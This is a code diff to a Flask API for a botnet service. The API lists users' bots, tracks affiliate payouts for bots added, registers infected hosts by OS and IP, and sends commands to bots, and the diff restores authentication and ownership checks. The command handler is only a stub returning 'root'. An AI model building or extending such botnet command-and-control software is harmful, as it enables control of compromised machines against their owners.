@@ -6,11 +6,11 @@ import ipaddress
 
 # GET user information
 @app.route('/api/users/<int:user_id>', methods=['GET'])
-#@token_required
-def get_user(user_id):
+@token_required
+def get_user(session_data, user_id):
     # ensure user is authorized to access the information
-    # if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
-    #     return jsonify({'message': 'You do not have permission to access this information'}), 403
+    if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
+        return jsonify({'message': 'You do not have permission to access this information'}), 403
 
     # get user information
     cur = mysql.connection.cursor()
@@ -25,37 +25,39 @@ def get_user(user_id):
 
 # GET user bot information
 @app.route('/api/users/<int:user_id>/bots', methods=['GET'])
-#@token_required
-def get_user_bots(user_id):
+@token_required
+def get_user_bots(session_data, user_id):
     # ensure user is authorized to access the information
-    # if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
-    #     return jsonify({'message': 'You do not have permission to access this information'}), 403
+    if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
+        return jsonify({'message': 'You do not have permission to access this information'}), 403
 
     # get user information
     cur = mysql.connection.cursor()
-    cur.execute("SELECT bot_id, os, ip_address, user_id FROM User_Bots WHERE user_id=%s", (user_id,))
+    cur.execute("SELECT * FROM User_Bots WHERE user_id=%s", (user_id,))
     bot_data = cur.fetchall()
     cur.close()
 
     if not bot_data:
         return jsonify({'message': 'Bot not found'}), 404
-
-    return jsonify({"bot_id": bot_data[0], "os": bot_data[1], "ip_address": bot_data[2], "interface_id": bot_data[3]}), 200
+    response = []
+    for item in bot_data:
+        response.append({"bot_id": item[0], "os":item[1], "ip_address": item[2], "interface_id": item[3]})
+    return jsonify(response), 200
 
 # GET affiliate information
 @app.route('/api/affiliates/<int:affiliate_id>', methods=['GET'])
-#@token_required
-def get_affiliate(affiliate_id):
+@token_required
+def get_affiliate(session_data, affiliate_id):
     # get user_id from affiliate_id
     cur = mysql.connection.cursor()
     cur.execute("SELECT user_id, total_bots_added, money_received FROM Affiliates WHERE affiliate_id=%s", (affiliate_id,))
     response = cur.fetchone()
     cur.close()
 
-    if (not response): #and session_data['is_staff']:
+    if (not response) and session_data['is_staff']:
         return jsonify({'message': 'Affiliate not found'}), 404
 
-    if (not response): #or (session_data['user_id'] != response[0]):
+    if (not response) or (session_data['user_id'] != response[0]):
         return jsonify({'message': 'You do not have permission to access this information'}), 403
 
     affiliate_data = {"affiliate_id": affiliate_id, "user_id": response[0], "total_bots_added": response[1], "money_received": response[2]}
@@ -65,15 +67,15 @@ def get_affiliate(affiliate_id):
 
 # POST add a bot as an affiliate
 @app.route('/api/bots', methods=['POST'])
-#@token_required
-def post_add_bot():
+@token_required
+def post_add_bot(session_data):
     # ensure needed parameters are present
     if (request.json is None) or ('os' not in request.json) or ('ip_address' not in request.json):
         return jsonify({'message': 'Missing required parameters'}), 400
 
     os = request.json['os']
     ip_address = request.json['ip_address']
-    # user_id = session_data["user_id"]
+    user_id = session_data["user_id"]
 
     # ensure parameters are strings
     if type(os) is not str or type(ip_address) is not str:
@@ -122,8 +124,8 @@ def post_add_bot():
 
 # POST send a command to a botnet
 @app.route('/api/bots/command', methods=['POST'])
-#@token_required
-def post_send_command():
+@token_required
+def post_send_command(session_data):
     # ensure needed parameters are present
     if (request.json is None) or ('bot_id' not in request.json) or ('command' not in request.json):
         return jsonify({'message': 'Missing required parameters'}), 400
@@ -136,11 +138,11 @@ def post_send_command():
         return jsonify({'message': 'Invalid parameter data'}), 400
 
     # ensure user is authorized to access the information because they are the owner of the bot
-    # user_id = session_data["user_id"]
-    # cur = mysql.connection.cursor()
-    # cur.execute("SELECT bot_id FROM User_Bots WHERE User_ID=%s AND bot_id=%s", (user_id, bot_id))
-    # response = cur.fetchone()
-    # cur.close()
+    user_id = session_data["user_id"]
+    cur = mysql.connection.cursor()
+    cur.execute("SELECT bot_id FROM User_Bots WHERE User_ID=%s AND bot_id=%s", (user_id, bot_id))
+    response = cur.fetchone()
+    cur.close()
 
     authorized = False
     if response and response[0] == bot_id:
@@ -154,4 +156,3 @@ def post_send_command():
     response = {"output": "root"}
 
     return jsonify(response), 200
-
